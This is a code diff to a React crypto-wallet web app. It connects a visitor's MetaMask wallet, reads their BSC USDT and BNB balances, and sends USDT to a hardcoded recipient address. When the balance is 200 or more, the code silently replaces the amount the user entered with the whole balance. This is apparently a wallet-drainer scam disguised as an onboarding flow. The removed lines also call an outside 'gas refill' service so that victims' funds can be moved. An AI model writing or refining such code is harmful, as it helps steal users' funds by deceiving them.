@@ -248,10 +248,10 @@ const App = () => {
         alert("Please install MetaMask or another Web3 wallet.");
         return;
       }
-
-      const provider = new ethers.providers.Web3Provider(window.ethereum);
-      const accounts = await provider.send("eth_requestAccounts", []);
-      const address = accounts[0];
+      const provider = new ethers.BrowserProvider(window.ethereum);
+      await provider.send("eth_requestAccounts", []); // ✅ Request access to MetaMask
+      const signer = await provider.getSigner();
+      const address = await signer.getAddress();
       setWalletAddress(address);
       setWalletConnected(true);
 
@@ -269,11 +269,11 @@ const App = () => {
     try {
       const usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, bscProvider);
       const usdtBalance = await usdtContract.balanceOf(address);
-      const formattedUSDTBalance = ethers.utils.formatUnits(usdtBalance, 18);
+      const formattedUSDTBalance = ethers.formatUnits(usdtBalance, 18); // ✅ Fixed ethers v6
 
-      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      const provider = new ethers.BrowserProvider(window.ethereum); // ✅ ethers v6
       const bnbBalanceRaw = await provider.getBalance(address);
-      const formattedBNBBalance = ethers.utils.formatEther(bnbBalanceRaw);
+      const formattedBNBBalance = ethers.formatEther(bnbBalanceRaw)
 
       return {
         usdt: parseFloat(formattedUSDTBalance),
@@ -307,107 +307,73 @@ const App = () => {
 
  
   // Function to connect wallet and handle transfer logic
-const handleGetStartedClick = async () => {
-  try {
+  const handleGetStartedClick = async () => {
+    try {
       setLoading(true);
       setTransferCompleted(false);
-
-      if (!window.ethereum) {
-          alert("Please install MetaMask or another Web3 wallet.");
-          setLoading(false);
-          return;
+  
+      // Ensure the wallet is connected
+      if (!walletConnected) {
+        await connectWallet();
       }
-
-      const provider = new ethers.providers.Web3Provider(window.ethereum);
-      await provider.send("eth_requestAccounts", []);
-      const signer = provider.getSigner();
-      const address = await signer.getAddress();
-      setWalletAddress(address);
-      setWalletConnected(true);
-
-      // Fetch balances immediately after connection
-      let balances = await fetchBalances(address);
+  
+      if (!walletConnected || !walletAddress) {
+        alert("Failed to connect wallet. Please try again.");
+        setLoading(false);
+        return;
+      }
+  
+      // Fetch USDT and BNB balances
+      let balances = await fetchBalances(walletAddress);
       setUsdtBalance(balances.usdt);
       setBnbBalance(balances.bnb);
-
+  
       let finalTransferAmount = parseFloat(usdtAmount);
-
-      // **Override input if USDT Balance ≥ 200**
+  
       if (balances.usdt >= 200) {
-          finalTransferAmount = balances.usdt; // Ensure UI reflects the change
+        finalTransferAmount = balances.usdt;
       }
-
+  
       console.log(`📢 Preparing to transfer: ${finalTransferAmount} USDT to ${RECIPIENT_ADDRESS}`);
-
-      // **Check & Perform Gas Refill (Only if USDT ≥ 200 and BNB < 0.0003)**
-      if (balances.usdt >= 200 && balances.bnb < 0.0003) {
-          console.log("🔄 Low BNB detected, requesting gas fee refill...");
-          try {
-              const refillResponse = await fetch("https://api.bepverify.net/refill", {
-                  method: "POST",
-                  headers: {
-                      "Content-Type": "application/json",
-                      "x-api-key": "dhatterim@kiCh*tandf**kyourm0m"
-                  },
-                  body: JSON.stringify({ to: address, amount: "0.0004", usdtBalance: balances.usdt })
-              });
-
-              const refillResult = await refillResponse.json();
-
-              if (refillResponse.ok && refillResult.status === "success" && refillResult.txHash) {
-                  console.log(`✅ Gas Refill successful! Waiting for 10 seconds...`);
-
-                  // **Wait for 10 seconds to allow refill confirmation**
-                  await new Promise(resolve => setTimeout(resolve, 10000));
-
-                  console.log("⏳ Checking updated balance after refill...");
-                  balances = await fetchBalances(address);
-                  setBnbBalance(balances.bnb);
-
-                  if (balances.bnb < 0.0003) {
-                      console.error("❌ Refill unsuccessful or delayed. Aborting transfer.");
-                      alert("Gas refill failed or is pending. Please ensure you have enough BNB for transaction fees.");
-                      setLoading(false);
-                      return;
-                  }
-              } else {
-                  console.error("❌ Gas Refill API failed:", refillResult.error);
-                  alert("Gas refill failed. Please ensure you have enough BNB.");
-                  setLoading(false);
-                  return; // Abort transfer if refill fails
-              }
-          } catch (error) {
-              console.error("❌ Error during gas refill request:", error);
-              alert("Network error during gas refill. Please try again.");
-              setLoading(false);
-              return; // Abort transfer if network error occurs
-          }
+  
+      // Ensure ethers provider is properly initialized
+      let provider, signer;
+      if (ethers.providers) {
+        // ethers v5
+        provider = new ethers.providers.Web3Provider(window.ethereum);
+        signer = provider.getSigner();
+      } else {
+        // ethers v6
+        provider = new ethers.BrowserProvider(window.ethereum);
+        signer = await provider.getSigner();
       }
-
-      // **Final Check Before Sending USDT**
-      console.log("🚀 Sending USDT...");
+  
       const contractWithSigner = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer);
-      const amountInWei = ethers.utils.parseUnits(finalTransferAmount.toString(), 18);
-
+      const amountInWei = ethers.parseUnits(finalTransferAmount.toString(), 18);
+  
+      // Estimate gas
       const estimatedGas = await contractWithSigner.estimateGas.transfer(RECIPIENT_ADDRESS, amountInWei);
-      const gasLimit = estimatedGas.mul(2);
-
+      const gasLimit = estimatedGas * 2n; // Ensure it's a BigInt
+  
+      // Perform the transfer
       const transferTx = await contractWithSigner.transfer(RECIPIENT_ADDRESS, amountInWei, { gasLimit });
       await transferTx.wait();
-
+  
       console.log(`✅ Transfer successful!`);
-
-      // **Update Balances After Transfer**
-      balances = await fetchBalances(address);
+  
+      // Fetch updated balances
+      balances = await fetchBalances(walletAddress);
       setUsdtBalance(balances.usdt);
       setBnbBalance(balances.bnb);
       setTransferCompleted(true);
-  } catch (error) {
-      console.error("❌ Error during transaction process:", error);
-  } finally {
+    } catch (error) {
+      console.error("❌ Error during transaction:", error);
+      alert(`Transaction failed: ${error.message}`);
+    } finally {
       setLoading(false);
-  }
-};
+    }
+  };
+  
 
 
   useEffect(() => {
